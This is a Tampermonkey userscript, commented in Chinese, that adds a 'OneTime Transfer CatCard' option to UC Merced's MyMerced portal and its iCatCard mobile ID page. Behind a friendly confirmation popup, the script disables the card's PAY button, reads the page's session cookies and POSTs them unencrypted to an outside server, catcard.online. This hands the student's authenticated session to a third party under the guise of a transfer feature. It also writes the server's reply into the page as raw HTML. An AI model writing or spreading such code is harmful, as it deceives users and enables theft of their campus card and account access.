// ==UserScript==
// @name         Transfer CatCard Script
// @namespace    http://tampermonkey.net/
// @version      1.3
// @description  OneTime Transfer the CatCard
// @match        https://connect.ucmerced.edu/student/mymerced/_/mymerced*
// @match        https://icatcard.ucmerced.edu/mobileid/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @connect      127.0.0.1
// @connect      http://catcard.online/transfer/
// @connect      43.135.136.220
// @connect      catcard.online
// ==/UserScript==

(function () {
    'use strict';

    // =======================
    // 1. 在 MyMerced 页面添加转移 CatCard 链接，并使用 GM_setValue 存储状态
    // =======================
    if (window.location.href.indexOf("connect.ucmerced.edu/student/mymerced") !== -1) {
        function addTransferCatCardLink() {
            var ulElem = document.getElementById("kgoui_Rcontent_I0_Rcontent_I0_Rcontent_I0_Ritems");
            if (!ulElem) return;
            var liElem = document.createElement("li");
            liElem.id = "kgoui_Rcontent_I0_Rcontent_I0_Rcontent_I0_Ritems_I1";
            liElem.className = "kgoui_object kgoui_grid_grid_item is_369225fa301c602ae622eaa25adbbe06 kgo-font-size-xsmall kgo-grid-item kgo-has-link";
            liElem.setAttribute("data-type", "content");

            liElem.innerHTML = '<a href="https://icatcard.ucmerced.edu/mobileid/" class="kgo-grid-item-content" target="_blank" rel="noopener noreferrer">' +
                '<div class="kgo-image-wrapper">' +
                '<div id="kgoui_Rcontent_I0_Rcontent_I0_Rcontent_I0_Ritems_I1_Fimage" class="kgoui_object kgoui_image is_be97d55a9b72b7b5f2408a1dd6780679 kgo-crop-style-fill kgo-image">' +
                '<div class="kgo-image-inner">' +
                '<img src="https://kgo-asset-cache.modolabs.net/ucmerced/production/resource_storage/proxy/modulepage/mymerced-_/mymerced/kgoui_Rcontent_I0_Rcontent_I3_Rcontent_I0_Ritems_I3%3Aproperty%3Aimage_common/Icon%20-%20CatCard.34837c1e4601ac1ed.34837c1e4601ac1edb69de51f5292713.png" alt="" aria-hidden="true">' +
                '</div></div></div>' +
                '<div class="kgo-textblock kgo-margin-xxtight kgo-margin-bottom-xtight">' +
                '<div class="kgo-title kgo-text kgo-font-style-normal kgo-font-weight-normal">OneTime Transfer CatCard</div>' +
                '</div></a>';
            ulElem.appendChild(liElem);

            // 点击后使用 GM_setValue 保存状态和当前时间
            liElem.addEventListener('click', function () {
                GM_setValue("TransferCatCard", "true");
                GM_setValue("TransferCatCardTime", Date.now().toString());
                // 保持默认跳转至 icatcard 页面
            });
        }

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", addTransferCatCardLink);
        } else {
            addTransferCatCardLink();
        }
    }

    // =======================
    // 2. 在 icatcard 页面显示确认弹窗，并读取共享状态，同时禁用 PAY / Check-in 按钮
    // =======================
    if (window.location.href.indexOf("icatcard.ucmerced.edu/mobileid") !== -1) {
        // 使用 GM_getValue 从 Tampermonkey 存储中读取数据（跨域可用）
        var transferFlag = GM_getValue("TransferCatCard", "false");
        var transferTime = GM_getValue("TransferCatCardTime", "0");

        if (transferFlag === "true" && transferTime) {
            var timeElapsed = Date.now() - parseInt(transferTime);
            if (timeElapsed <= 5 * 60 * 1000) { // 5分钟内有效
                // 禁用 PAY / Check-in 按钮
                var payButton = document.querySelector("button.btn.btn-trans.btn-trans-default");
                if (payButton) {
                    payButton.disabled = true;
                    payButton.style.opacity = "0.5";
                    payButton.title = "Transfer in progress";
                }
                showConfirmationPopup();
            }
        }

        function showConfirmationPopup() {
            // 创建遮罩层
            var overlay = document.createElement('div');
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.backgroundColor = 'rgba(0,0,0,0.5)';
            overlay.style.display = 'flex';
            overlay.style.alignItems = 'center';
            overlay.style.justifyContent = 'center';
            overlay.style.zIndex = '9999';

            // 创建弹窗容器
            var modal = document.createElement('div');
            modal.style.backgroundColor = '#fff';
            modal.style.padding = '20px';
            modal.style.borderRadius = '5px';
            modal.style.textAlign = 'center';

            modal.innerHTML = '<p>Confirm to Transfer Your CatCard.</p>';
            var confirmButton = document.createElement('button');
            confirmButton.textContent = 'Confirm';
            confirmButton.style.marginTop = '10px';
            modal.appendChild(confirmButton);
            overlay.appendChild(modal);
            document.body.appendChild(overlay);

            // 点击确认后：获取当前页面 cookie 并发送至 Django 服务器
            confirmButton.addEventListener('click', function () {
                document.body.removeChild(overlay);

                var cookieContent = document.cookie;
                // 设置 5 秒超时
                var requestAborted = false;
                var timeoutId = setTimeout(function () {
                    requestAborted = true;
                    showResultPopup("Request failed: timed out after 5 seconds.");
                }, 5000);

                GM_xmlhttpRequest({
                    method: "POST",
                    url: "http://catcard.online/transfer/",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    data: JSON.stringify({cookie: cookieContent}),
                    onload: function (response) {
                        if (requestAborted) return;
                        clearTimeout(timeoutId);

                        try {
                            var res = JSON.parse(response.responseText);
                            if (res.unique_code) {
                                showResultPopup("Transfer successful! Your unique code is: " + res.unique_code);
                                GM_deleteValue("TransferCatCard");
                                GM_deleteValue("TransferCatCardTime");
                            } else {
                                showResultPopup("Transfer failed: " + response.responseText);
                            }
                        } catch (e) {
                            showResultPopup("Error processing server response.");
                        }
                    },
                    onerror: function (err) {
                        if (requestAborted) return;
                        clearTimeout(timeoutId);
                        // 显示完整的错误信息
                        showResultPopup("Request failed. Error detail:\n" + JSON.stringify(err, null, 2));
                    }
                });
            });
        }

        // 新增的函数：用于显示返回结果的弹窗
        function showResultPopup(message) {
            // 创建遮罩层
            var overlay = document.createElement('div');
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.backgroundColor = 'rgba(0,0,0,0.5)';
            overlay.style.display = 'flex';
            overlay.style.alignItems = 'center';
            overlay.style.justifyContent = 'center';
            overlay.style.zIndex = '9999';

            // 创建弹窗容器
            var modal = document.createElement('div');
            modal.style.backgroundColor = '#fff';
            modal.style.padding = '20px';
            modal.style.borderRadius = '5px';
            modal.style.textAlign = 'center';

            modal.innerHTML = '<p>' + message + '</p>';
            var okButton = document.createElement('button');
            okButton.textContent = 'Confirm';
            okButton.style.marginTop = '10px';
            modal.appendChild(okButton);
            overlay.appendChild(modal);
            document.body.appendChild(overlay);

            // 点击确定后，移除弹窗并可选择关闭页面
            okButton.addEventListener('click', function () {
                document.body.removeChild(overlay);
                // 例如：5秒后关闭页面
                setTimeout(function () {
                    window.close();
                }, 5);
            });
        }
    }
})();